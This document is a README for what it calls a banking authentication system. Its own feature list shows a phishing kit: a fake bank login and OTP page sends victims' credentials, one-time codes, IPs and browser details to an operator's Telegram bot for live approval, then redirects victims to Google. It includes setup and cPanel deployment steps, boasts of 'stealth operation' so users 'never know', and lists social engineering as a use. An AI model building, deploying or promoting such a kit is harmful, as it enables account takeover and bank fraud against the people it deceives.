# 🏦 Banking Authentication System

A professional Next.js banking application with **dual admin approval system** for login credentials and OTP verification. Features real-time Telegram bot integration for secure approval management.

## ✨ Key Features

### 🔐 Dual Approval System

- **Login Approval**: Admin receives Telegram message when user submits credentials
- **OTP Approval**: Second Telegram message for 6-digit OTP verification
- **Real-time Decisions**: Instant approve/reject via Telegram inline buttons
- **Complete Control**: Admin oversight for every authentication step

### 🎨 Professional UI/UX

- **Banking-Grade Interface**: Clean, modern design matching real banking systems
- **Dynamic Greetings**: Time-based "Good morning/afternoon/evening" messages
- **Modern OTP Input**: 6 separate digit inputs with auto-focus and paste support
- **Animated Success**: Checkmark animation with auto-redirect to Google
- **Mobile Responsive**: Perfect experience on all devices

### 🚀 User Experience

- **Seamless Flow**: Natural loading states during approval process
- **Realistic Messages**: "Verifying your identity..." rotating messages
- **Error Handling**: User-friendly error messages (never reveals admin rejection)
- **Fast Redirect**: 5-second countdown to Google after success

### 📱 Admin Control

- **Telegram Integration**: Instant approval requests with full context
- **One-Click Decisions**: Approve/reject directly in Telegram
- **Detailed Information**: User credentials, IP, browser, timestamp
- **Stealth Operation**: Users never know it's manual approval

## 🚀 Quick Start

### 1. Clone & Install

```bash
git clone <your-repo>
cd banking-auth-system
npm install
```

### 2. Configure Telegram Bot

```bash
# 1. Message @BotFather on Telegram → Create new bot
# 2. Message @userinfobot → Get your Chat ID
# 3. Update src/config/cpanel-config.js with your credentials
```

### 3. Set Up Webhook

```bash
npm run setup-webhook
# Enter your domain when prompted
```

### 4. Start Development

```bash
npm run dev
# Visit http://localhost:3000
```

## 📱 Complete User Flow

### 🔑 Login Process

1. **Landing Page**: Professional banking login with dynamic greeting
2. **Credential Entry**: Username/password with modern input design
3. **Processing**: "Verifying your identity..." with rotating messages
4. **Admin Decision**: Telegram message sent to admin
5. **Result**: Approved → OTP page | Rejected → "Invalid credentials"

### 📟 OTP Process

1. **OTP Page**: 6 separate digit inputs with auto-focus
2. **Code Entry**: Modern input with paste support and validation
3. **Processing**: "Processing verification code..." messages
4. **Admin Decision**: Second Telegram message for OTP approval
5. **Result**: Approved → Success page | Rejected → "Invalid code"

### 🎉 Success Page

1. **Animated Checkmark**: Smooth scale and draw animations
2. **Success Message**: "Verification Successful!" confirmation
3. **Auto-Redirect**: 5-second countdown to Google.com
4. **Manual Option**: "Continue to Google Now" button

## 🛠️ Technical Architecture

### 📁 Project Structure

```
src/
├── app/
│   ├── page.js                    # 🏠 Login page with dynamic greeting
│   ├── otp/page.js               # 📟 Modern 6-digit OTP input
│   ├── thank-you/page.js         # 🎉 Animated success page
│   └── api/
│       ├── admin-approval/       # 🔐 Login approval endpoints
│       ├── otp-approval/         # 📟 OTP approval endpoints
│       └── telegram-webhook/     # 📱 Telegram callback handler
├── components/
│   └── ClientProtection.js      # 🛡️ Security wrapper
├── lib/
│   ├── approval-system.js       # ⚙️ Core approval logic
│   └── session.js               # 🔑 Session management
└── config/
    └── cpanel-config.js         # ⚙️ Configuration
```

### 🔧 Tech Stack

- **Frontend**: Next.js 14, React 18, Tailwind CSS
- **Backend**: Next.js API Routes (Serverless)
- **Integration**: Telegram Bot API with webhooks
- **Deployment**: cPanel compatible with Node.js
- **Security**: Session management, timeout protection

## ⚙️ Configuration

Update `src/config/cpanel-config.js`:

```javascript
const CPANEL_CONFIG = {
  // Get from @BotFather
  TELEGRAM_BOT_TOKEN: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",

  // Get from @userinfobot
  TELEGRAM_CHAT_ID: "123456789",

  // Your domain
  APP_URL: "https://yourdomain.com",

  // Timeouts (optional)
  APPROVAL_TIMEOUT_MS: 300000, // 5 minutes
  OTP_TIMEOUT_MS: 300000, // 5 minutes
};
```

## 🚀 cPanel Deployment

### Quick Deploy

1. **Build locally**: `npm run build`
2. **Upload files** to cPanel public_html
3. **Enable Node.js** in cPanel
4. **Install dependencies**: `npm install --production`
5. **Set webhook**: Update Telegram webhook URL
6. **Start app**: Restart in cPanel Node.js manager

### Complete Guide

See **[CPANEL-DEPLOYMENT.md](./CPANEL-DEPLOYMENT.md)** for detailed deployment instructions including:

- cPanel Node.js setup
- Domain configuration
- SSL certificate setup
- Telegram webhook configuration
- Troubleshooting guide

## 🧪 Testing & Scripts

```bash
# Test approval system
npm run test-approval

# Test error resilience
npm run test-resilience

# Setup Telegram webhook
npm run setup-webhook
```

## 📚 Documentation

- **[CPANEL-DEPLOYMENT.md](./CPANEL-DEPLOYMENT.md)** - Complete deployment guide
- **[ADMIN-APPROVAL-SETUP.md](./ADMIN-APPROVAL-SETUP.md)** - Detailed setup instructions
- **[CPANEL-SETUP.md](./CPANEL-SETUP.md)** - Original cPanel configuration

## 🔒 Security Features

### 🛡️ Built-in Protection

- **Session Management**: Unique flow IDs for each user
- **Timeout Protection**: Automatic cleanup of expired sessions
- **Error Resilience**: Fallback mechanisms for lost sessions
- **Client Protection**: Anti-bot and security measures
- **Secure Communication**: HTTPS required for webhooks

### 🕵️ Stealth Operation

- **Hidden Admin Process**: Users see natural authentication flow
- **Realistic Error Messages**: "Invalid credentials" instead of "Admin rejected"
- **Professional Loading**: Banking-style processing messages
- **No Manual Indicators**: Appears completely automated

## 🎯 Perfect For

- **🏦 Banking Applications**: Secure login with admin oversight
- **🔒 High-Security Systems**: Dual approval for sensitive operations
- **📋 Compliance Requirements**: Complete audit trail
- **🌍 Remote Monitoring**: Admin approval from anywhere
- **🎭 Social Engineering**: Realistic banking interface

## 📞 Deployment Support

**Common Issues:**

- ✅ Telegram bot not responding → Check webhook setup
- ✅ App won't start → Verify Node.js version (18.x+)
- ✅ SSL errors → Enable Let's Encrypt in cPanel
- ✅ Approval timeout → Check admin availability

**Quick Fixes:**

1. Verify `CPANEL_CONFIG` values
2. Test webhook with `getWebhookInfo`
3. Check cPanel error logs
4. Ensure domain SSL is active

---

## 🎉 Ready to Deploy!

Your professional banking authentication system with dual admin approval is ready for production deployment on cPanel hosting.

**⚡ Features Complete:**

- ✅ Professional banking UI with dynamic greetings
- ✅ Modern 6-digit OTP input with auto-focus
- ✅ Animated success page with auto-redirect
- ✅ Dual Telegram approval system
- ✅ Complete cPanel deployment guide
- ✅ Stealth operation (users never know it's manual)

**🚀 Deploy now and start managing secure authentications!**
